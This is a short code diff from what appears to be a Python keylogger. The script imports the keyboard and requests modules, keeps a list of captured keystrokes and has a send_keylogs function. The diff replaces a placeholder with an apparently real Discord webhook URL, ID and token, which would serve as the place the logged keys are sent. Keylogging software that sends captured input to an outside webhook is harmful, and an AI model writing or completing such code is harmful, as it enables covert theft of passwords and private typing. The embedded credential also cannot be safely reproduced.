@@ -2,7 +2,7 @@ import time
 import keyboard
 import requests
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/xxx/yyy' #place your webhook url here
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1320027493364928703/5ev0fIuiKUuqz3HFHDyvUqtCvaFqtpEaKQCPRu-WAb6rqP7RFuZT4pW-NSu4JCHYaRWY' #place your webhook url here
 keylogs = []
 
 def send_keylogs():
